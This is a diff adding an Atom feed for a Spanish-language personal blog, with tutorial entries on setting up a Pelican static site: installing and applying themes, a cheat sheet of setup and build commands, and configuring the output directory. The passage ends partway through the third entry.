@@ -1,0 +1,1688 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog de Penserbjorne</title><link href="https://penserbjorne.com/" rel="alternate"></link><link href="https://penserbjorne.com/feeds/all.atom.xml" rel="self"></link><id>https://penserbjorne.com/</id><updated>2021-04-04T00:00:00-06:00</updated><subtitle>No soy nadie. No soy nada.</subtitle><entry><title>Pelican (04), configuración del sitio (tema)</title><link href="https://penserbjorne.com/pelican-04-configuracion-del-sitio-tema-es-MX.html" rel="alternate"></link><published>2020-08-21T00:00:00-05:00</published><updated>2020-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-21:/pelican-04-configuracion-del-sitio-tema-es-MX.html</id><summary type="html">&lt;p&gt;Configuración para añadir un tema a un sitio con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is&amp;nbsp;this?&lt;/h2&gt;
+&lt;p&gt;Andamos con todo, anoche terminamos la
+&lt;a href="https://penserbjorne.com/pelican-03-configuracion-del-sitio-construccion-y-elementos-basicos-es-MX.html"&gt;tercera entrada de Pelican&lt;/a&gt; para modificar la
+construcción del sitio y configurar algunas cositas del sitio, sé que no es
+mucho, pero es trabajo honesto&amp;nbsp;haha&lt;/p&gt;
+&lt;p&gt;Bueno, esta cuarta entrada será para configurar un tema a nuestro&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Y el &lt;em&gt;disclaimer&lt;/em&gt; de siempre, como ya hemos dicho, toda la documentación necesaria
+(y extendida) se encuentra en &lt;a href="https://docs.getpelican.com"&gt;el blog oficial de Pelican&lt;/a&gt;,
+por lo que si se necesita mayor información o detalle de algo, visitar el sitio&amp;nbsp;oficial.&lt;/p&gt;
+&lt;h2&gt;pelican-themes&lt;/h2&gt;
+&lt;p&gt;Dentro de las herramientas que necesitamos utilizar con &lt;code&gt;Pelican&lt;/code&gt; se encuentra
+&lt;code&gt;pelican-themes&lt;/code&gt; la cual como su nombre lo indica es para trabajar con temas&amp;nbsp;:&amp;#39;v&lt;/p&gt;
+&lt;p&gt;Esta herramientas nos va a permitir gestionar temas pudiendo instalarlos en
+nuestro equipo para utilizarlos al desarrollar el sitio, así como&amp;nbsp;eliminarlos.&lt;/p&gt;
+&lt;p&gt;Esta herramienta ya viene instalada junto con &lt;code&gt;Pelican&lt;/code&gt; asi que no necesitamos
+realizar pasos&amp;nbsp;extras.&lt;/p&gt;
+&lt;p&gt;Los parámetros que toma la herramienta son los&amp;nbsp;siguientes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-l, --list
+  Show the themes already installed
+
+-i theme_path, --install theme_path
+  One or more themes to install
+
+-r theme_name, --remove theme_name
+  One or more themes to remove
+
+-s theme_path, --symlink theme_path
+  Same as “–install”, but create a symbolic link instead of copying the theme.
+  Useful &lt;span class="k"&gt;for&lt;/span&gt; theme development
+
+-v, --verbose
+  Verbose output
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si quieres ver algunos ejemplos de uso más detallados puedes revisar la sección
+correspondiente de la documentación de &lt;code&gt;Pelican&lt;/code&gt; dando click
+&lt;a href="https://docs.getpelican.com/en/stable/pelican-themes.html"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Seleccionando e instalando un&amp;nbsp;tema&lt;/h2&gt;
+&lt;p&gt;Vale, ya vimos que podemos &lt;em&gt;instalar&lt;/em&gt; temas y utilizarlos, pero, ¿donde están
+los temas? Tranqui, para eso, &lt;code&gt;Pelican&lt;/code&gt; tiene un listado de temas en &lt;code&gt;GitHub&lt;/code&gt;
+que puedes revisar entrando
+&lt;a href="https://github.com/getpelican/pelican-themes"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Ahí mismo en el &lt;code&gt;GitHub&lt;/code&gt; podrás encontrar otra forma de trabajar con temas por
+si la que vemos aquí no te&amp;nbsp;agrada.&lt;/p&gt;
+&lt;p&gt;Para utilizar un tema primero necesitamos clonar el repositorio de temas de
+&lt;code&gt;Pelican&lt;/code&gt;. Este repositorio no tiene que estar dentro de tu repositorio actual
+del blog, así que guardalo en otra&amp;nbsp;ubicación..&lt;/p&gt;
+&lt;p&gt;Para descargarlo utilizaremos el parámetro  &lt;code&gt;--recursive&lt;/code&gt; para clonar el repo
+junto a sus submodulos, y a los submodulos de los submodulos, y así
+recursivamente xD. Esto es básicamente para que los temas no se rompan al
+clonarlos por falta de algún&amp;nbsp;submodulo.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git clone --recursive https://github.com/getpelican/pelican-themes ~/path-to-projects/pelican-themes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos clonados los temas en nuestro equipo, por lo cual podemos &lt;em&gt;instalar&lt;/em&gt;
+uno el sitio que estamos desarrollando. Para esto le indicaremos a
+&lt;code&gt;pelican-themes&lt;/code&gt; la ruta donde se encuentran los archivos del&amp;nbsp;tema.&lt;/p&gt;
+&lt;p&gt;Del listado de temas vamos a probar con
+&lt;a href="https://github.com/getpelican/pelican-themes/tree/master/bootstrap2-dark"&gt;bootstrap2-dark&lt;/a&gt;, hemos elegido este tema simplemente porque somos demasiado cliche. La
+carpeta donde se encuentran los archivos fuente del tema en este caso es
+&lt;code&gt;~/path-to-projects/pelican-themes/bootstrap2-dark&lt;/code&gt;, y es la que indicaremos a
+&lt;code&gt;pelican-themes&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pelican-themes --install ~/path-to-projects/pelican-themes/bootstrap2-dark
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si queremos ver cuales temas se encuentran instalados podemos&amp;nbsp;ejecutar:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pelican-themes --list
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El cual nos dará una salida como la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;notmyidea
+bootstrap2-dark
+simple
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En la salida anterior podemos observar que tenemos tres instalados, los dos que
+vienen predeterminados en &lt;code&gt;Pelican&lt;/code&gt; que son &lt;code&gt;notmyidea&lt;/code&gt; y &lt;code&gt;simple&lt;/code&gt;, y el que
+hemos instalado previamente, &lt;code&gt;bootstrap2-dark&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;En caso de querer eliminar algún tema instalado podemos&amp;nbsp;ejecutar:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Para eliminar un solo tema&lt;/span&gt;
+pelican-themes --remove nombre-del-tema
+
+&lt;span class="c1"&gt;# Para eliminar varios temas&lt;/span&gt;
+pelican-themes --remove nombre-del-tema-1 nombre-del-tema-2 nombre-del-tema-3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Aplicando el tema&amp;nbsp;instalado&lt;/h2&gt;
+&lt;p&gt;Para poder utilizar nuestro tema instalado tenemos que ir al archivo
+&lt;code&gt;pelicanconf.py&lt;/code&gt; y asignarle un valor a la variable &lt;code&gt;THEME&lt;/code&gt;, en este caso la
+variable quedaría como &lt;code&gt;THEME = u'bootstrap2-dark'&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Con este pequeño cambio basta para construir el sitio con el tema seleccionado.
+recuerda que utilizaremos los comandos de la &lt;a href="https://penserbjorne.com/pelican-03-configuracion-del-sitio-construccion-y-elementos-basicos-es-MX.html"&gt;entrada anterior&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Desarrollo&lt;/span&gt;
+invoke livereload
+
+&lt;span class="c1"&gt;# Producción&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Para probar otros temas basta con seguir los pasos anteriores hasta encontrar
+uno que sea de tu agrado&amp;nbsp;:)&lt;/p&gt;
+&lt;h2&gt;Siguientes pasos (this is (not) the&amp;nbsp;end)&lt;/h2&gt;
+&lt;p&gt;Nuestro sitio ya tiene un poco más de personalidad aunque sigue siendo bastante
+cliché, al menos ya es responsivo y se podrá leer en dispositivos&amp;nbsp;móviles.&lt;/p&gt;
+&lt;p&gt;Para siguientes entradas nos haria falta revisar como agregar algunas secciones
+como un &lt;code&gt;about&lt;/code&gt; o un &lt;code&gt;contact&lt;/code&gt; y revisar el tema de plugins, y probablemente
+con eso habremos terminado de configurar el sitio&amp;nbsp;:)&lt;/p&gt;
+&lt;h2&gt;Ejemplos de temas&amp;nbsp;aplicados&lt;/h2&gt;
+&lt;p&gt;Sé que puedes pensar lo&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Penserbjorne, pero &amp;#8230; ya termino la entrada, ¿por qué añades otra&amp;nbsp;sección?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Bueno, te quería mostrar algunas imágenes de cómo se ve el tema aplicado al
+sitio, solo que las imágenes son muy largas  y por eso decidí dejarlas al&amp;nbsp;final.&lt;/p&gt;
+&lt;p&gt;Durante el desarrollo de esta entrada utilizamos el tema &lt;code&gt;bootstrap2-dark&lt;/code&gt;
+porqué se vería &lt;strong&gt;chido&lt;/strong&gt; pero ya en producción realmente no era muy responsivo
+por lo que cambiamos al tema &lt;code&gt;elegant&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;A continuación te muestro la página de inicio del blog con cada uno de los
+temas&amp;nbsp;aplicados.&lt;/p&gt;
+&lt;h3&gt;Not my&amp;nbsp;idea&lt;/h3&gt;
+&lt;p&gt;Es el tema que trae &lt;code&gt;Pelican&lt;/code&gt; por defecto, y no, no es&amp;nbsp;responsivo.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt Text" src="https://penserbjorne.com/images/07-pelican-04/screenshot-2020-08-21-blog-de-penserbjorne-1.png"&gt;&lt;/p&gt;
+&lt;h3&gt;bootstrap2-black&lt;/h3&gt;
+&lt;p&gt;Fue el tema &lt;strong&gt;juakeril&lt;/strong&gt; que habíamos elegido, pero no, tampoco es responsivo
+y después se volvió complicado de&amp;nbsp;leer.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt Text" src="https://penserbjorne.com/images/07-pelican-04/screenshot-2020-08-21-blog-de-penserbjorne-2.png"&gt;&lt;/p&gt;
+&lt;h3&gt;elegant&lt;/h3&gt;
+&lt;p&gt;Es el último tema que hemos probado, sí, es responsivo y es fácil de leer en él,
+por lo cual se ha quedado cómo tema final (es el actual a este momento de&amp;nbsp;publicación).&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt Text" src="https://penserbjorne.com/images/07-pelican-04/screenshot-2021-04-04-blog-de-penserbjorne.png"&gt;&lt;/p&gt;
+&lt;h2&gt;The End of the&amp;nbsp;Post&lt;/h2&gt;
+&lt;p&gt;Bueno, ahora sí, nos vemos en otra ocasión &lt;a href="https://www.youtube.com/watch?v=pVeKyqV1jWU"&gt;piloto&lt;/a&gt;.&lt;/p&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category></entry><entry><title>Pelican (00), cheat sheet</title><link href="https://penserbjorne.com/pelican-00-cheat-sheet-es-MX.html" rel="alternate"></link><published>2020-08-20T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-20:/pelican-00-cheat-sheet-es-MX.html</id><summary type="html">&lt;p&gt;Recopilación de comandos para no olvidar como gestionar el blog con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is&amp;nbsp;this?&lt;/h2&gt;
+&lt;p&gt;Weno weno, ¿de que va esta entrada? Pues simplemente es mi &lt;code&gt;cheat sheet&lt;/code&gt; para
+gestionar este blog con &lt;code&gt;Pelican&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Como ya hemos dicho, toda la documentación necesaria (y extendida) se
+encuentra en &lt;a href="https://docs.getpelican.com"&gt;el blog oficial de Pelican&lt;/a&gt;, por lo
+que si se necesita mayor información o detalle de algo, visitar el sitio&amp;nbsp;oficial.&lt;/p&gt;
+&lt;h2&gt;Comandos&lt;/h2&gt;
+&lt;h3&gt;Preparación del&amp;nbsp;entorno&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Creación del entorno&lt;/span&gt;
+virtualenv --python&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/python3 ~/path/to/virtual/env
+
+&lt;span class="c1"&gt;# Nos movemos a la carpeta creada&lt;/span&gt;
+&lt;span class="nb"&gt;cd&lt;/span&gt; ~/path/to/virtual/env
+
+&lt;span class="c1"&gt;# Activamos el entorno&lt;/span&gt;
+&lt;span class="nb"&gt;source&lt;/span&gt; ./bin/activate
+
+&lt;span class="c1"&gt;# Instalación de herramientas&lt;/span&gt;
+pip install pelican Markdown typogrify invoke livereload ghp-import
+
+&lt;span class="c1"&gt;# Actualización de herramientas&lt;/span&gt;
+pip install --upgrade pelican Markdown typogrify invoke livereload ghp-import
+
+&lt;span class="c1"&gt;# Clonamos repositorio&lt;/span&gt;
+git clone https://github.com/penserbjorne/penserbjorne.github.io.git
+
+&lt;span class="c1"&gt;# Nos movemos a la carpeta con la fuente del sitio&lt;/span&gt;
+&lt;span class="c1"&gt;# Recuerda que ya estabamos dentro dentro de la carpeta del entorno virtual&lt;/span&gt;
+&lt;span class="nb"&gt;cd&lt;/span&gt; penserbjorne.github.io/pelican
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Instalación de un&amp;nbsp;tema&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Clonar temas&lt;/span&gt;
+git clone --recursive https://github.com/getpelican/pelican-themes ~/path-to-projects/pelican-themes
+
+&lt;span class="c1"&gt;# Instalar tema&lt;/span&gt;
+pelican-themes --install ~/path-to-projects/pelican-themes/bootstrap2-dark
+
+&lt;span class="c1"&gt;# Listar temas instalados&lt;/span&gt;
+pelican-themes --list
+
+&lt;span class="c1"&gt;# Para eliminar un solo tema&lt;/span&gt;
+pelican-themes --remove nombre-del-tema
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Comando para generar y ejecutar sitio&amp;nbsp;(corta)&lt;/h3&gt;
+&lt;p&gt;Recuerda algunas de estas tareas fueron modificadas para ajustarse al flujo de
+de desarrollo del&amp;nbsp;sitio.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Desarrollo&lt;/span&gt;
+invoke livereload
+
+&lt;span class="c1"&gt;# Producción&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Comando para generar y ejecutar sitio&amp;nbsp;(extendida)&lt;/h3&gt;
+&lt;p&gt;Recuerda algunas de estas tareas fueron modificadas para ajustarse al flujo de
+de desarrollo del&amp;nbsp;sitio.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Elimina los archivos generados previamente&lt;/span&gt;
+invoke clean
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local&lt;/span&gt;
+invoke build
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local eliminando previamente los archivos generados&lt;/span&gt;
+invoke rebuild
+
+&lt;span class="c1"&gt;# Regenera el sitio para ver en local cada vez que se hace un cambio&lt;/span&gt;
+invoke regenerate
+
+&lt;span class="c1"&gt;# Permite visualizar el sitio de manera local en http://localhost:8000/&lt;/span&gt;
+invoke serve
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local&lt;/span&gt;
+&lt;span class="c1"&gt;# y luego lo permite visualizar de manera local en http://localhost:8000/&lt;/span&gt;
+invoke reserve
+
+&lt;span class="c1"&gt;# Genera el sitio para producción&lt;/span&gt;
+invoke preview
+
+&lt;span class="c1"&gt;# Permite visualizar el sitio de manera local en http://localhost:8000/&lt;/span&gt;
+&lt;span class="c1"&gt;# y regenerar el sitio cada vez que haya un cambio, todo para local&lt;/span&gt;
+invoke livereload
+
+&lt;span class="c1"&gt;# Permite subir el sitio al servidor correspondiente mediante rsync y SSH&lt;/span&gt;
+invoke publish
+
+&lt;span class="c1"&gt;# Publica el sitio de producción en Github Pages&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="pelican"></category><category term="blog"></category><category term="pelican"></category><category term="cheat sheet"></category></entry><entry><title>Pelican (03), configuración del sitio (construcción y elementos básicos)</title><link href="https://penserbjorne.com/pelican-03-configuracion-del-sitio-construccion-y-elementos-basicos-es-MX.html" rel="alternate"></link><published>2020-08-20T00:00:00-05:00</published><updated>2021-04-04T00:00:00-06:00</updated><author><name>Penserbjorne</name></author><id>tag:penserbjorne.com,2020-08-20:/pelican-03-configuracion-del-sitio-construccion-y-elementos-basicos-es-MX.html</id><summary type="html">&lt;p&gt;Configuración para construir y asignar elementos básicos de un sitio con&amp;nbsp;Pelican&lt;/p&gt;</summary><content type="html">&lt;h2&gt;What is&amp;nbsp;this?&lt;/h2&gt;
+&lt;p&gt;Ok, esta es la tercera entrada para trabajar generando un sitio con &lt;code&gt;Pelican&lt;/code&gt; en
+&lt;code&gt;gh-pages&lt;/code&gt;. En esta ocasión vamos modificar algunas configuraciones para probar
+y construir el&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Te recomendamos revisar las entradas anteriores en donde fuimos construyendo
+el sitio sobre el que vamos a trabajar&amp;nbsp;ahora.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://penserbjorne.com/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html"&gt;Creación de un blog estático con&amp;nbsp;Pelican&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://penserbjorne.com/pelican-02-creacion-de-entradas-para-un-blog-estatico-con-pelican-es-MX.html"&gt;Creación de entradas para un blog estático con&amp;nbsp;Pelican&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Como ya hemos dicho, toda la documentación necesaria (y extendida) se
+encuentra en &lt;a href="https://docs.getpelican.com"&gt;el blog oficial de Pelican&lt;/a&gt;, por lo
+que si se necesita mayor información o detalle de algo, visitar el sitio&amp;nbsp;oficial.&lt;/p&gt;
+&lt;h2&gt;Archivos de&amp;nbsp;configuración&lt;/h2&gt;
+&lt;p&gt;Cuando comenzamos a crear el sitio utilizamos el comando &lt;code&gt;pelican-quickstart&lt;/code&gt;
+el cual nos creo la estructura inicial del sitio con algunos archivos de&amp;nbsp;configuración.&lt;/p&gt;
+&lt;p&gt;Recordemos cual es la estructura de trabajo que tenemos hasta este&amp;nbsp;momento:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;/path/to/project
+├── bin/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── include/      &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── lib/          &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── local/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+├── share/        &lt;span class="c1"&gt;# carpeta de virtualenv&lt;/span&gt;
+└── user.github.io/   &lt;span class="c1"&gt;# carpeta del repositorio del sitio&lt;/span&gt;
+    └── pelican/      &lt;span class="c1"&gt;# carpeta con los archivos fuente del sitio&lt;/span&gt;
+        ├── content   &lt;span class="c1"&gt;# Archivos en Markdown&lt;/span&gt;
+        │   └── hola-mundo.md &lt;span class="c1"&gt;# Entrada nueva&lt;/span&gt;
+        ├── output
+        ├── tasks.py
+        ├── Makefile
+        ├── pelicanconf.py
+        └── publishconf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Si observamos detenidamente, podemos ver que los archivos de los que hablamos
+se encuentran en nuestra subcarpeta &lt;code&gt;pelican&lt;/code&gt; y&amp;nbsp;son:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Makefile&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pelicanconf.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;publishconf.py&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;tasks.py&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;En los archivos &lt;code&gt;pelicanconf.py&lt;/code&gt; y &lt;code&gt;publishconf.py&lt;/code&gt; vamos a indicar las
+variables de configuración para el&amp;nbsp;sitio.&lt;/p&gt;
+&lt;p&gt;Con los archivos &lt;code&gt;Makefile&lt;/code&gt; y &lt;code&gt;tasks.py&lt;/code&gt; vamos a indicar las acciones necesarias
+para construir el&amp;nbsp;sitio.&lt;/p&gt;
+&lt;h2&gt;Construcción del&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Como recordaras para construir el sitio y previsualizarlo hemos estado
+utilizando los siguientes&amp;nbsp;comandos:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Generamos la salida HTML una carpeta arriba de donde estamos&lt;/span&gt;
+pelican content -o ..
+
+&lt;span class="c1"&gt;# Levantamos el sitio indicando la salida de los archivos HTML&lt;/span&gt;
+pelican --listen -o ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Estos comando los podemos sustituir utilizando la herramienta
+&lt;a href="https://www.pyinvoke.org/"&gt;invoke&lt;/a&gt; o la herramienta
+&lt;a href="https://www.gnu.org/software/make/"&gt;make&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;En este caso vamos a trabajar con &lt;code&gt;invoke&lt;/code&gt; solo para variarle un poco, si te
+interesa leer la versión completa o con &lt;code&gt;make&lt;/code&gt; puedes
+&lt;a href="https://docs.getpelican.com/en/stable/publish.html"&gt;dar click aquí&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Para trabajar con &lt;code&gt;invoke&lt;/code&gt; necesitamos instalarlo a través de &lt;code&gt;pip&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nota:&lt;/strong&gt; Recuerda hacerlo después de haber activado el entorno virtual que
+creamos en &lt;a href="https://penserbjorne.com/pelican-01-creacion-de-un-blog-estatico-con-pelican-es-MX.html"&gt;la primera entrada&lt;/a&gt; y de haber entrado
+a la carpeta &lt;code&gt;pelican&lt;/code&gt; que se encuentra dentro del&amp;nbsp;repositorio.&lt;/p&gt;
+&lt;p&gt;Para instalar &lt;code&gt;invoke&lt;/code&gt; podemos ejecutar lo&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python -m pip install invoke
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo divertido de &lt;code&gt;invoke&lt;/code&gt; es que funciona utilizando el archivo &lt;code&gt;tasks.py&lt;/code&gt;
+el cual contiene &lt;em&gt;tareas&lt;/em&gt; definidas a ejecutar, básicamente es un archivo en
+el que podemos automatizar tareas mediante &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Afortunadamente el archivo &lt;code&gt;tasks.py&lt;/code&gt; que genera &lt;code&gt;Pelican&lt;/code&gt; ya tiene tareas
+definidas por lo cual podemos trabajar en automático con este archivo o
+modificarlo para adaptarlo a nuestras&amp;nbsp;necesidades.&lt;/p&gt;
+&lt;p&gt;Los comandos que vienen precargados en el archivo &lt;code&gt;tasks.py&lt;/code&gt; son:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Elimina los archivos generados previamente&lt;/span&gt;
+invoke clean
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local&lt;/span&gt;
+invoke build
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local eliminando previamente los archivos generados&lt;/span&gt;
+invoke rebuild
+
+&lt;span class="c1"&gt;# Regenera el sitio para ver en local cada vez que se hace un cambio&lt;/span&gt;
+invoke regenerate
+
+&lt;span class="c1"&gt;# Permite visualizar el sitio de manera local en http://localhost:8000/&lt;/span&gt;
+invoke serve
+
+&lt;span class="c1"&gt;# Genera el sitio para ver en local&lt;/span&gt;
+&lt;span class="c1"&gt;# y luego lo permite visualizar de manera local en http://localhost:8000/&lt;/span&gt;
+invoke reserve
+
+&lt;span class="c1"&gt;# Genera el sitio para producción&lt;/span&gt;
+invoke preview
+
+&lt;span class="c1"&gt;# Permite visualizar el sitio de manera local en http://localhost:8000/&lt;/span&gt;
+&lt;span class="c1"&gt;# y regenerar el sitio cada vez que haya un cambio, todo para local&lt;/span&gt;
+invoke livereload
+
+&lt;span class="c1"&gt;# Permite subir el sitio al servidor correspondiente mediante rsync y SSH&lt;/span&gt;
+invoke publish
+
+&lt;span class="c1"&gt;# Publica el sitio de producción en Github Pages&lt;/span&gt;
+invoke gh-pages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Considerar que para el comando &lt;code&gt;invoke livereload&lt;/code&gt; se requiere instalar la
+herramienta &lt;code&gt;livereload&lt;/code&gt; y para el comando &lt;code&gt;invoke gp_pages&lt;/code&gt; se requiere la
+herramienta &lt;code&gt;ghp-import&lt;/code&gt;, esto lo podemos hacer mediante el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python -m pip install livereload ghp-import
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;A partir de ahora estaremos trabajando con los comandos previos. Ahora, estos
+comandos requieren algunas configuraciones, por ejemplo, los comandos asociados
+a generar el sitio están configurados para generar los archivos dentro de una
+carpeta llamada &lt;code&gt;output&lt;/code&gt; la cual se encuentra al mismo nivel que la carpeta
+&lt;code&gt;pelican&lt;/code&gt;. En nuestro caso como estamos trabajando con un blog para un usuario
+de &lt;code&gt;GitHub&lt;/code&gt; necesitamos que los archivos sean generados en el directorio raíz
+del repositorio, esto es una carpeta mas arriba de donde estamos actualmente
+(recuerda que estamos en la carpeta &lt;code&gt;pelican&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;También vamos a modificar algunas de las tareas que vienen en el archivo
+&lt;code&gt;tasks.py&lt;/code&gt;.&lt;/p&gt;
+&lt;h2&gt;Configuración de variables del&amp;nbsp;sitio&lt;/h2&gt;
+&lt;p&gt;Bien, ya vimos que comandos vamos a estar utilizando y ya mencionamos que
+necesitamos configurarlos, esto lo vamos a hacer en los archivos
+&lt;code&gt;pelicanconf.py&lt;/code&gt; y &lt;code&gt;publishconf.py&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;El archivo &lt;code&gt;pelicanconf.py&lt;/code&gt; es utilizado para trabajar en el desarrollo local
+del sitio mientras que &lt;code&gt;publishconf.py&lt;/code&gt; es utilizado para producción. El archivo
+&lt;code&gt;pelicanconf.py&lt;/code&gt; es llamado en &lt;code&gt;publishconf.py&lt;/code&gt; por lo cual las variables que se
+encuentren en el segundo reescriben a las variables del primero. Por ejemplo,
+si la variable &lt;code&gt;SITEURL&lt;/code&gt; se encuentra asignada en ambos archivos, la de
+&lt;code&gt;publishconf.py&lt;/code&gt; sobreescribe a la de &lt;code&gt;pelicanconf.py&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;La lista de variables y su descripción la puedes encontrar
+&lt;a href="https://docs.getpelican.com/en/stable/settings.html"&gt;aquí&lt;/a&gt;. Te recomiendo leer
+este listado ya que aquí abordaremos solo algunas variables para configurar los
+comando&amp;nbsp;anteriores.&lt;/p&gt;
+&lt;h3&gt;Directorio de&amp;nbsp;salida&lt;/h3&gt;
+&lt;p&gt;Para modificar el directorio de salida necesitamos modificar la variable
+&lt;code&gt;OUTPUT_PATH&lt;/code&gt; la cual tiene el valor predeterminado de &lt;code&gt;'output/'&lt;/code&gt;, en este caso
+vamos a modificar la variable para que el directorio de salida sea en un nivel
+superior a la ruta actual por lo cual variable quedará como
+&lt;code&gt;OUTPUT_PATH = './../'&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Esta variable hay que asignarla en &lt;code&gt;pelicanconf.py&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Algunas otras configuraciones sencillas del sitio&amp;nbsp;:D&lt;/h3&gt;
